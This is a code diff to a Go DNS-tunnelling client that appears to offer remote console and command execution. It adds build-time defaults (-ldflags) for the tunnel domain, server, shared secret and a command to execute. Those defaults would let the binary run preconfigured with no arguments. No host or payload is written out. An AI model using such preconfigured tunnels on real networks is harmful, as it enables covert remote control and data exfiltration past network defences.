@@ -20,10 +20,22 @@ const (
 	Version = "v0.07-go"
 )
 
+// Build-time configurable defaults (can be set via -ldflags)
+var (
+	DefaultDomain     = ""
+	DefaultServer     = ""
+	DefaultPort       = "53"
+	DefaultSecret     = ""
+	DefaultExec       = ""
+	DefaultDelay      = "1000"
+	DefaultDNSTypes   = "TXT,CNAME,MX"
+	DisableEncryption = "false"
+)
+
 func main() {
 	rand.Seed(time.Now().UnixNano())
 
-	// Command line flags
+	// Command line flags with build-time defaults
 	var (
 		domain        string
 		dnsServer     string
@@ -40,18 +52,18 @@ func main() {
 		isn           int
 	)
 
-	flag.StringVar(&domain, "domain", "", "Domain to tunnel through (e.g., example.com)")
-	flag.StringVar(&dnsServer, "dns-server", "", "DNS server to use")
+	flag.StringVar(&domain, "domain", DefaultDomain, "Domain to tunnel through (e.g., example.com)")
+	flag.StringVar(&dnsServer, "dns-server", DefaultServer, "DNS server to use")
 	flag.UintVar(&dnsPort, "dns-port", 53, "DNS port")
-	flag.StringVar(&dnsTypes, "dns-type", "TXT,CNAME,MX", "DNS record types to use")
-	flag.StringVar(&secret, "secret", "", "Pre-shared secret for authentication")
-	flag.BoolVar(&noEncryption, "no-encryption", false, "Disable encryption")
+	flag.StringVar(&dnsTypes, "dns-type", DefaultDNSTypes, "DNS record types to use")
+	flag.StringVar(&secret, "secret", DefaultSecret, "Pre-shared secret for authentication")
+	flag.BoolVar(&noEncryption, "no-encryption", DisableEncryption == "true", "Disable encryption")
 	flag.IntVar(&delay, "delay", 1000, "Delay between packets in ms")
 	flag.IntVar(&maxRetransmit, "max-retransmits", 20, "Max retransmit attempts (-1 for infinite)")
 	flag.BoolVar(&packetTrace, "packet-trace", false, "Enable packet tracing")
 	flag.BoolVar(&doPing, "ping", false, "Ping the server and exit")
 	flag.BoolVar(&doConsole, "console", false, "Start a console session (instead of command)")
-	flag.StringVar(&doExec, "exec", "", "Execute a command")
+	flag.StringVar(&doExec, "exec", DefaultExec, "Execute a command")
 	flag.IntVar(&isn, "isn", -1, "Initial sequence number (for debugging)")
 
 	flag.Usage = func() {
